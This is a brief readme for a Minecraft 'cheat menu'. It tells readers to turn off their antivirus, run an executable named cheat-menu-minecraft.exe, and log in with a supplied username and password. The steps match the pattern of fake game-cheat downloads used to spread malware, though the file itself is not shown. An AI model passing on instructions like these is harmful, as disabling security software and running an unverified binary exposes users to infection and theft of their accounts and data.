---Cheat Menu for Minecraft---
----------------------------------------------
1) Turn OFF Antivirus
----------------------------------------------
2) Open "cheat-menu-minecraft.exe"
----------------------------------------------
3) Login on menu.. usernamen: estellematucci32
                   password: PKZEJ2PGEE3035
----------------------------------------------
4) Menu has open your minecraft
----------------------------------------------
5) Press "Insert" and have fun!
----------------------------------------------